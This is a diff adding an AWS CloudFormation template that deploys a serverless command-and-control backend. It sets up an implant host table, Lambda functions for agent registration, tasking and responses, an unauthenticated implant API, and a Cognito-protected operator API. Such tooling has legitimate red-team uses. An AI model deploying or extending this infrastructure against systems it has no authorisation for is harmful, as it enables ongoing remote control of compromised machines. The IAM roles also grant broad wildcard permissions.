@@ -1,0 +1,607 @@
+AWSTemplateFormatVersion: '2010-09-09'
+Description: 'This template will create the following:
++1. Create a dynamodb table which is the backend database for all the implants. 
++2. Create IAM roles. (Creates lambda role.)
++3. Create the various lambda functions.
++4. Setup AWS API Gateway default listener
++5. Setup AWS Cognito'
+
+Parameters:
+  UserEmail:
+    Type: String
+    Description: Enter an email for the first admin user.
+  DeploymentBucket:
+    Type: String
+    Description: Enter the S3 Deployment Bucket.
+Resources:
+  #Hosts table
+  HostTable:
+    Type: AWS::DynamoDB::Table
+    Properties:
+      AttributeDefinitions:
+        - AttributeName: hostid
+          AttributeType: S
+      KeySchema:
+        - AttributeName: hostid
+          KeyType: HASH
+      BillingMode: PAY_PER_REQUEST
+  #
+  #Lambda Roles and Functions
+  #
+  LambdaImplantRole:
+    Type: 'AWS::IAM::Role'
+    Properties:
+      AssumeRolePolicyDocument:
+        Version: "2012-10-17"
+        Statement:
+          - Effect: Allow
+            Principal:
+              Service:
+                - lambda.amazonaws.com
+            Action:
+              - 'sts:AssumeRole'
+      Path: /
+      Policies:
+        - PolicyName: TablePrivileges
+          PolicyDocument:
+            Version: "2012-10-17"
+            Statement:
+              - Effect: Allow
+                Action: 
+                  - "dynamodb:PutItem"
+                  - "dynamodb:GetItem"
+                  - "dynamodb:UpdateItem"
+                  - "dynamodb:Scan"
+                Resource: !GetAtt HostTable.Arn
+        - PolicyName: AWSLambdaBasicExecutionRole
+          PolicyDocument:
+            Version: "2012-10-17"
+            Statement:
+              - Effect: Allow
+                Action: 
+                  - "logs:CreateLogGroup"
+                  - "logs:CreateLogStream"
+                  - "logs:PutLogEvents"
+                Resource: "*"
+  RegisterAgentLambda:
+    Type: 'AWS::Lambda::Function'
+    Properties:
+      Handler: lambda_function.lambda_handler
+      Runtime: python3.9
+      Role: !GetAtt LambdaImplantRole.Arn
+      Environment:
+        Variables:
+          HostsDatabase: !Ref HostTable
+      Code:
+        S3Bucket: !Ref DeploymentBucket
+        S3Key: registerAgent.zip
+  GetTaskLambda:
+    Type: 'AWS::Lambda::Function'
+    Properties:
+      Handler: lambda_function.lambda_handler
+      Runtime: python3.9
+      Role: !GetAtt LambdaImplantRole.Arn
+      Environment:
+        Variables:
+          HostsDatabase: !Ref HostTable
+      Code:
+        S3Bucket: !Ref DeploymentBucket
+        S3Key: getTask.zip
+  SendResponseLambda:
+    Type: 'AWS::Lambda::Function'
+    Properties:
+      Handler: lambda_function.lambda_handler
+      Runtime: python3.9
+      Role: !GetAtt LambdaImplantRole.Arn
+      Environment:
+        Variables:
+          HostsDatabase: !Ref HostTable
+      Code:
+        S3Bucket: !Ref DeploymentBucket
+        S3Key: sendResponse.zip
+  AuthenticatedLambda:
+    Type: 'AWS::Lambda::Function'
+    Properties:
+      Handler: lambda_function.lambda_handler
+      Runtime: python3.9
+      Role: !GetAtt LambdaImplantRole.Arn
+      Environment:
+        Variables:
+          HostsDatabase: !Ref HostTable
+      Code:
+        S3Bucket: !Ref DeploymentBucket
+        S3Key: authenticated.zip
+  SendTaskLambda:
+    Type: 'AWS::Lambda::Function'
+    Properties:
+      Handler: lambda_function.lambda_handler
+      Runtime: python3.9
+      Role: !GetAtt LambdaImplantRole.Arn
+      Environment:
+        Variables:
+          HostsDatabase: !Ref HostTable
+      Code:
+        S3Bucket: !Ref DeploymentBucket
+        S3Key: sendTask.zip
+  #
+  #API - Implant Portion
+  #
+  ServerlessC2API :
+    Type : AWS::ApiGateway::RestApi
+    Properties :
+        Name : !Join [ '-', [ ImplantAPI, !Select [3, !Split ["-", !Ref DeploymentBucket]] ] ]
+        Parameters:
+            endpointConfigurationTypes: REGIONAL
+  ImplantRegisterResource:
+    Type: AWS::ApiGateway::Resource
+    Properties:
+      RestApiId: !Ref ServerlessC2API
+      ParentId: !GetAtt ServerlessC2API.RootResourceId
+      PathPart: agent-registration
+  ImplantRegisterGetMethod:
+    Type: AWS::ApiGateway::Method
+    Properties:
+      AuthorizationType: NONE
+      HttpMethod: GET
+      MethodResponses:
+        - StatusCode: 200
+          ResponseModels: { "application/json": "Empty" }
+      Integration:
+        IntegrationHttpMethod: POST
+        Type: AWS_PROXY
+        Uri: !Sub
+          - arn:aws:apigateway:${AWS::Region}:lambda:path/2015-03-31/functions/${lambdaArn}/invocations
+          - lambdaArn: !GetAtt RegisterAgentLambda.Arn
+      ResourceId: !Ref ImplantRegisterResource
+      RestApiId: !Ref ServerlessC2API
+  LambdaPermissionsImplantRegisterGetMethod:
+    Type: AWS::Lambda::Permission
+    Properties:
+      Action: lambda:InvokeFunction
+      FunctionName: !GetAtt RegisterAgentLambda.Arn
+      Principal: apigateway.amazonaws.com
+      SourceArn: !Sub
+        - 'arn:aws:execute-api:${AWS::Region}:${AWS::AccountId}:${apiGatewayID}/*/GET/agent-registration'
+        - apiGatewayID: !Ref ServerlessC2API
+  ImplantGetMethod:
+    Type: AWS::ApiGateway::Method
+    Properties:
+      AuthorizationType: NONE
+      HttpMethod: GET
+      MethodResponses:
+        - StatusCode: 200
+          ResponseModels: { "application/json": "Empty" }
+      Integration:
+        IntegrationHttpMethod: POST
+        Type: AWS_PROXY
+        Uri: !Sub
+          - arn:aws:apigateway:${AWS::Region}:lambda:path/2015-03-31/functions/${lambdaArn}/invocations
+          - lambdaArn: !GetAtt GetTaskLambda.Arn
+      ResourceId: !GetAtt ServerlessC2API.RootResourceId
+      RestApiId: !Ref ServerlessC2API
+  LambdaPermissionsImplantGetMethod:
+    Type: AWS::Lambda::Permission
+    Properties:
+      Action: lambda:InvokeFunction
+      FunctionName: !GetAtt GetTaskLambda.Arn
+      Principal: apigateway.amazonaws.com
+      SourceArn: !Sub
+        - 'arn:aws:execute-api:${AWS::Region}:${AWS::AccountId}:${apiGatewayID}/*/GET/'
+        - apiGatewayID: !Ref ServerlessC2API
+  ImplantPostMethod:
+    Type: AWS::ApiGateway::Method
+    Properties:
+      AuthorizationType: NONE
+      HttpMethod: POST
+      MethodResponses:
+        - StatusCode: 200
+          ResponseModels: { "application/json": "Empty" }
+      Integration:
+        IntegrationHttpMethod: POST
+        Type: AWS_PROXY
+        Uri: !Sub
+          - arn:aws:apigateway:${AWS::Region}:lambda:path/2015-03-31/functions/${lambdaArn}/invocations
+          - lambdaArn: !GetAtt SendResponseLambda.Arn
+      ResourceId: !GetAtt ServerlessC2API.RootResourceId
+      RestApiId: !Ref ServerlessC2API
+  LambdaPermissionsImplantPostMethod:
+    Type: AWS::Lambda::Permission
+    Properties:
+      Action: lambda:InvokeFunction
+      FunctionName: !GetAtt SendResponseLambda.Arn
+      Principal: apigateway.amazonaws.com
+      SourceArn: !Sub
+        - 'arn:aws:execute-api:${AWS::Region}:${AWS::AccountId}:${apiGatewayID}/*/POST/'
+        - apiGatewayID: !Ref ServerlessC2API
+  ImplantAPIDeployment:
+    Type: AWS::ApiGateway::Deployment
+    DependsOn: 
+    - ImplantRegisterGetMethod
+    - LambdaPermissionsImplantRegisterGetMethod
+    - ImplantGetMethod
+    - LambdaPermissionsImplantGetMethod
+    - ImplantPostMethod
+    - LambdaPermissionsImplantPostMethod
+    Properties:
+      RestApiId: !Ref ServerlessC2API
+      StageName: prod
+  #
+  #API - Managament Portion
+  #
+  ManagementAPI :
+    Type : AWS::ApiGateway::RestApi
+    Properties :
+        Name : !Join [ '-', [ ManagementAPI, !Select [3, !Split ["-", !Ref DeploymentBucket]] ] ]
+        Parameters:
+            endpointConfigurationTypes: REGIONAL
+  AuthenticatedGetMethod:
+    Type: AWS::ApiGateway::Method
+    Properties:
+      AuthorizationType: COGNITO_USER_POOLS
+      AuthorizerId: !Ref APICognitoAuthorizer
+      HttpMethod: GET
+      MethodResponses:
+        - StatusCode: 200
+          ResponseModels: { "application/json": "Empty" }
+      Integration:
+        IntegrationHttpMethod: POST
+        Type: AWS_PROXY
+        Uri: !Sub
+          - arn:aws:apigateway:${AWS::Region}:lambda:path/2015-03-31/functions/${lambdaArn}/invocations
+          - lambdaArn: !GetAtt  AuthenticatedLambda.Arn
+      MethodResponses:
+        - StatusCode: 200
+          ResponseModels:
+            application/json: 'Empty'
+          ResponseParameters:
+            method.response.header.Access-Control-Allow-Origin: false
+      ResourceId: !GetAtt ManagementAPI.RootResourceId
+      RestApiId: !Ref ManagementAPI
+  LambdaPermissionsAuthenticatedGetMethod:
+    Type: AWS::Lambda::Permission
+    Properties:
+      Action: lambda:InvokeFunction
+      FunctionName: !GetAtt AuthenticatedLambda.Arn
+      Principal: apigateway.amazonaws.com
+      SourceArn: !Sub
+        - 'arn:aws:execute-api:${AWS::Region}:${AWS::AccountId}:${apiGatewayID}/*/GET/'
+        - apiGatewayID: !Ref ManagementAPI
+  AuthenticatedGetCORS:
+    Type: AWS::ApiGateway::Method
+    Properties:
+      AuthorizationType: NONE
+      RestApiId:
+        Ref: ManagementAPI
+      ResourceId:
+        !GetAtt ManagementAPI.RootResourceId
+      HttpMethod: OPTIONS
+      Integration:
+        IntegrationResponses:
+          - StatusCode: 200
+            ResponseParameters:
+              method.response.header.Access-Control-Allow-Headers: "'Content-Type,X-Amz-Date,Authorization,X-Api-Key,X-Amz-Security-Token'"
+              method.response.header.Access-Control-Allow-Methods: "'GET,OPTIONS'"
+              method.response.header.Access-Control-Allow-Origin: "'*'"
+              method.response.header.Access-Control-Allow-Credentials: "'true'"
+            ResponseTemplates:
+              application/json: ''
+        PassthroughBehavior: WHEN_NO_MATCH
+        RequestTemplates:
+          application/json: '{"statusCode": 200}'
+        Type: MOCK
+      MethodResponses:
+        - StatusCode: 200
+          ResponseModels:
+            application/json: 'Empty'
+          ResponseParameters:
+            method.response.header.Access-Control-Allow-Headers: false
+            method.response.header.Access-Control-Allow-Methods: false
+            method.response.header.Access-Control-Allow-Origin: false
+            method.response.header.Access-Control-Allow-Credentials: false
+  AuthenticatedSendTaskResource:
+    Type: AWS::ApiGateway::Resource
+    Properties:
+      RestApiId: !Ref ManagementAPI
+      ParentId: !GetAtt ManagementAPI.RootResourceId
+      PathPart: sendTask
+  AuthenticatedSendTaskPostMethod:
+    Type: AWS::ApiGateway::Method
+    Properties:
+      AuthorizationType: COGNITO_USER_POOLS
+      AuthorizerId: !Ref APICognitoAuthorizer
+      HttpMethod: POST
+      Integration:
+        IntegrationHttpMethod: POST
+        Type: AWS_PROXY
+        Uri: !Sub
+          - arn:aws:apigateway:${AWS::Region}:lambda:path/2015-03-31/functions/${lambdaArn}/invocations
+          - lambdaArn: !GetAtt  SendTaskLambda.Arn
+      MethodResponses:
+        - StatusCode: 200
+          ResponseModels:
+            application/json: 'Empty'
+          ResponseParameters:
+            method.response.header.Access-Control-Allow-Origin: false
+      ResourceId: !Ref AuthenticatedSendTaskResource
+      RestApiId: !Ref ManagementAPI
+  LambdaPermissionsAuthenticatedSendTaskPostMethod:
+    Type: AWS::Lambda::Permission
+    Properties:
+      Action: lambda:InvokeFunction
+      FunctionName: !GetAtt SendTaskLambda.Arn
+      Principal: apigateway.amazonaws.com
+      SourceArn: !Sub
+        - 'arn:aws:execute-api:${AWS::Region}:${AWS::AccountId}:${apiGatewayID}/*/POST/sendTask'
+        - apiGatewayID: !Ref ManagementAPI
+  AuthenticatedSendTaskCORS:
+    Type: AWS::ApiGateway::Method
+    Properties:
+      AuthorizationType: NONE
+      RestApiId:
+        Ref: ManagementAPI
+      ResourceId:
+        !Ref AuthenticatedSendTaskResource
+      HttpMethod: OPTIONS
+      Integration:
+        IntegrationResponses:
+          - StatusCode: 200
+            ResponseParameters:
+              method.response.header.Access-Control-Allow-Headers: "'Content-Type,X-Amz-Date,Authorization,X-Api-Key,X-Amz-Security-Token'"
+              method.response.header.Access-Control-Allow-Methods: "'POST,OPTIONS'"
+              method.response.header.Access-Control-Allow-Origin: "'*'"
+              method.response.header.Access-Control-Allow-Credentials: "'true'"
+            ResponseTemplates:
+              application/json: ''
+        PassthroughBehavior: WHEN_NO_MATCH
+        RequestTemplates:
+          application/json: '{"statusCode": 200}'
+        Type: MOCK
+      MethodResponses:
+        - StatusCode: 200
+          ResponseModels:
+            application/json: 'Empty'
+          ResponseParameters:
+            method.response.header.Access-Control-Allow-Headers: false
+            method.response.header.Access-Control-Allow-Methods: false
+            method.response.header.Access-Control-Allow-Origin: false
+            method.response.header.Access-Control-Allow-Credentials: false
+  ManagementAPIDeployment:
+    Type: AWS::ApiGateway::Deployment
+    DependsOn: 
+    - AuthenticatedGetMethod
+    - LambdaPermissionsAuthenticatedGetMethod
+    - AuthenticatedGetCORS
+    - AuthenticatedSendTaskPostMethod
+    - LambdaPermissionsAuthenticatedSendTaskPostMethod
+    - AuthenticatedSendTaskCORS
+    Properties:
+      RestApiId: !Ref ManagementAPI
+      StageName: prod
+  #
+  #Cognito Portion
+  #
+  CognitoUnauthorizedRole:
+    Type: "AWS::IAM::Role"
+    Properties:
+      AssumeRolePolicyDocument: 
+        Version: "2012-10-17"
+        Statement:
+          - Effect: "Allow"
+            Principal: 
+              Federated: "cognito-identity.amazonaws.com"
+            Action: 
+              - "sts:AssumeRoleWithWebIdentity"
+            Condition:
+              StringEquals: 
+                "cognito-identity.amazonaws.com:aud": !Ref IdentityPool
+              "ForAnyValue:StringLike":
+                "cognito-identity.amazonaws.com:amr": unauthenticated
+      Policies:
+        - PolicyName: "CognitoUnauthorizedPolicy"
+          PolicyDocument: 
+            Version: "2012-10-17"
+            Statement: 
+              - Effect: "Allow"
+                Action:
+                  - "mobileanalytics:PutEvents"
+                  - "cognito-sync:*"
+                Resource: "*"
+  CognitoAuthorizedRole:
+    Type: "AWS::IAM::Role"
+    Properties:
+      AssumeRolePolicyDocument: 
+        Version: "2012-10-17"
+        Statement:
+          - Effect: "Allow"
+            Principal: 
+              Federated: "cognito-identity.amazonaws.com"
+            Action: 
+              - "sts:AssumeRoleWithWebIdentity"
+            Condition:
+              StringEquals: 
+                "cognito-identity.amazonaws.com:aud": !Ref IdentityPool
+              "ForAnyValue:StringLike":
+                "cognito-identity.amazonaws.com:amr": authenticated
+      Policies:
+        - PolicyName: "CognitoAuthorizedPolicy"
+          PolicyDocument: 
+            Version: "2012-10-17"
+            Statement: 
+              - Effect: "Allow"
+                Action:
+                  - "mobileanalytics:PutEvents"
+                  - "cognito-sync:*"
+                  - "cognito-identity:*"
+                Resource: "*"
+              - Effect: "Allow"
+                Action:
+                  - "dynamodb:PutItem"
+                  - "dynamodb:GetItem"
+                  - "dynamodb:Scan"
+                  - "dynamodb:UpdateItem"
+                Resource: "*"
+              - Effect: "Allow"
+                Action:
+                 - "apigateway:GET"
+                Resource: '*'
+              - Effect: "Allow"
+                Action:
+                  - "s3:GetObject"
+                  - "s3:ListBucket"
+                Resource: "*"
+  ServerlessC2AdminRole:
+    Type: "AWS::IAM::Role"
+    Properties:
+      AssumeRolePolicyDocument: 
+        Version: "2012-10-17"
+        Statement:
+          - Effect: "Allow"
+            Principal: 
+              Federated: "cognito-identity.amazonaws.com"
+            Action: 
+              - "sts:AssumeRoleWithWebIdentity"
+            Condition:
+              StringEquals: 
+                "cognito-identity.amazonaws.com:aud": !Ref IdentityPool
+              "ForAnyValue:StringLike":
+                "cognito-identity.amazonaws.com:amr": authenticated
+      Policies:
+        - PolicyName: "CognitoAuthorizedPolicy"
+          PolicyDocument: 
+            Version: "2012-10-17"
+            Statement: 
+              - Effect: "Allow"
+                Action:
+                  - "mobileanalytics:PutEvents"
+                  - "cognito-sync:*"
+                  - "cognito-identity:*"
+                Resource: "*"
+              - Effect: "Allow"
+                Action:
+                  - "dynamodb:PutItem"
+                  - "dynamodb:GetItem"
+                  - "dynamodb:Scan"
+                  - "dynamodb:UpdateItem"
+                Resource: "*"
+              - Effect: "Allow"
+                Action:
+                 - "apigateway:GET"
+                Resource: '*'
+              - Effect: "Allow"
+                Action:
+                  - "s3:GetObject"
+                  - "s3:ListBucket"
+                Resource: "*"
+              - Effect: "Allow"
+                Action:
+                  - "cognito-idp:AdminDeleteUser"
+                  - "cognito-idp:ListUsersInGroup"
+                  - "cognito-idp:AdminEnableUser"
+                  - "cognito-idp:AdminListUserAuthEvents"
+                  - "cognito-idp:ListGroups"
+                  - "cognito-idp:AdminCreateUser"
+                  - "cognito-idp:AdminDisableUser"
+                  - "cognito-idp:AdminRemoveUserFromGroup"
+                  - "cognito-idp:AdminAddUserToGroup"
+                  - "cognito-idp:AdminResetUserPassword"
+                  - "cognito-idp:ListUsers"
+                Resource: "*"
+  UserPool:
+    Type: AWS::Cognito::UserPool
+    Properties:
+      UsernameConfiguration: 
+        CaseSensitive: false
+      AutoVerifiedAttributes:
+        - email
+      Schema:
+        - Name: email
+          AttributeDataType: String
+          Mutable: false
+          Required: true
+      Policies:
+        PasswordPolicy:
+          MinimumLength: 16
+          RequireLowercase: true
+          RequireNumbers: true
+
+  AdminGroup:
+    Type: AWS::Cognito::UserPoolGroup
+    Properties: 
+      Description: Gives user administration permissions.
+      GroupName: Admins
+      UserPoolId: !Ref UserPool
+  
+  UserPoolClient:
+    Type: "AWS::Cognito::UserPoolClient"
+    Properties:
+      ClientName: "ServerlessC2Client"
+      GenerateSecret: false
+      UserPoolId: !Ref UserPool
+  
+  IdentityPool:
+    Type: "AWS::Cognito::IdentityPool"
+    Properties:
+      AllowUnauthenticatedIdentities: false
+      CognitoIdentityProviders: 
+        - ClientId: !Ref UserPoolClient
+          ProviderName: !GetAtt UserPool.ProviderName
+  
+  IdentityPoolRoleMapping:
+    Type: "AWS::Cognito::IdentityPoolRoleAttachment"
+    Properties:
+      IdentityPoolId: !Ref IdentityPool
+      Roles:
+        authenticated: !GetAtt CognitoAuthorizedRole.Arn
+        unauthenticated: !GetAtt CognitoUnauthorizedRole.Arn
+      RoleMappings:
+        "ServerlessC2Client":
+          IdentityProvider: !Join [ "", ["cognito-idp.", !Sub "${AWS::Region}", ".amazonaws.com/", !Ref UserPool, ":", !Ref UserPoolClient] ]
+          AmbiguousRoleResolution: AuthenticatedRole
+          Type: Rules
+          RulesConfiguration: 
+            Rules: 
+              - Claim: "cognito:groups"
+                MatchType: "Contains"
+                RoleARN: !GetAtt ServerlessC2AdminRole.Arn
+                Value: "Admins"
+  APICognitoAuthorizer:
+    Type: AWS::ApiGateway::Authorizer
+    Properties:
+      IdentitySource: method.request.header.authorization
+      Name: CognitoAuthorizer
+      ProviderARNs:
+        - Fn::GetAtt:
+            - UserPool
+            - Arn
+      RestApiId: !Ref ManagementAPI
+      Type: COGNITO_USER_POOLS
+
+  #First User
+  FirstUser:
+    Type: AWS::Cognito::UserPoolUser
+    Properties:
+      UserPoolId: !Ref UserPool
+      Username: !Ref UserEmail
+      UserAttributes:
+        - Name: email
+          Value: !Ref UserEmail
+  FirstUserGroup:
+    Type : AWS::Cognito::UserPoolUserToGroupAttachment
+    Properties :
+      GroupName : Admins
+      Username : !Ref FirstUser
+      UserPoolId : !Ref UserPool
+
+Outputs:
+  UserPoolId:
+    Value: !Ref UserPool
+    Description: This goes in the config.js file.
+  UserPoolClientId:
+    Value: !Ref UserPoolClient
+    Description: This goes in the config.js file.
+  IdentityPoolId: 
+    Value: !Ref IdentityPool
+    Description: This goes in the config.js file.
+  ManagementId: 
+    Value: !Ref ManagementAPI
+    Description: This goes in the config.js file.
